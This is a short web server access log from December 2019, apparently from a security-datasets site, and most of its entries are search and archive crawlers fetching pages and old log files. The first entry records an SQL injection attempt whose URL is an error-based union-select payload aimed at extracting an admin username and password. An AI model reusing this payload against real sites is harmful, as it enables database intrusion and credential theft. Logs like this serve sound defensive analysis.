120.92.217.177 - - [24/Dec/2019:02:46:05 -0800] "GET //news/html/?410'union/**/select/**/1/**/from/**/(select/**/count(*),concat(floor(rand(0)*2),0x3a,(select/**/concat(user,0x3a,password)/**/from/**/pwn_base_admin/**/limit/**/0,1),0x3a)a/**/from/**/information_schema.tables/**/group/**/by/**/a)b/**/where'1'='1.html HTTP/1.1" 404 257 "-" "-" 
157.55.39.156 - - [24/Dec/2019:02:55:31 -0800] "GET /self.logs/access.log.2017-11-22.gz HTTP/1.1" 200 24175 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.113 - - [24/Dec/2019:03:00:32 -0800] "GET /self.logs/access.log.2017-06-02.gz HTTP/1.1" 200 16726 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
157.55.39.156 - - [24/Dec/2019:03:06:44 -0800] "GET /self.logs/error.log.2018-11-15.gz HTTP/1.1" 200 3497 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.113 - - [24/Dec/2019:03:07:52 -0800] "GET /self.logs/error.log.2018-07-23.gz HTTP/1.1" 200 6966 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.241.233.138 - - [24/Dec/2019:03:09:43 -0800] "GET /robots.txt HTTP/1.0" 200 251 "-" "Mozilla/5.0 (compatible; archive.org_bot +http://archive.org/details/archive.org_bot)" 
207.241.233.138 - - [24/Dec/2019:03:09:44 -0800] "GET /Datasets%20Description/Network/ftp.html HTTP/1.0" 200 4831 "http://www.secrepo.com/" "Mozilla/5.0 (compatible; archive.org_bot +http://archive.org/details/archive.org_bot)" 
207.241.233.138 - - [24/Dec/2019:03:09:45 -0800] "GET /Datasets%20Description/Network/files.html HTTP/1.0" 200 4975 "http://www.secrepo.com/" "Mozilla/5.0 (compatible; archive.org_bot +http://archive.org/details/archive.org_bot)" 
207.46.13.122 - - [24/Dec/2019:03:10:34 -0800] "GET / HTTP/1.1" 301 475 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
66.249.66.90 - - [24/Dec/2019:03:11:30 -0800] "GET /Datasets%20Description/PE_malware/VirusShare.html HTTP/1.1" 200 1572 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" 
207.46.13.122 - - [24/Dec/2019:03:11:45 -0800] "GET / HTTP/1.1" 200 12660 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.122 - - [24/Dec/2019:03:18:19 -0800] "GET /self.logs/2016/error.log.2016-05-07.gz HTTP/1.1" 200 800 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.113 - - [24/Dec/2019:03:24:21 -0800] "GET /self.logs/access.log.2017-01-19.gz HTTP/1.1" 200 18281 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
207.46.13.122 - - [24/Dec/2019:03:28:14 -0800] "GET /self.logs/error.log.2018-10-15.gz HTTP/1.1" 200 4909 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
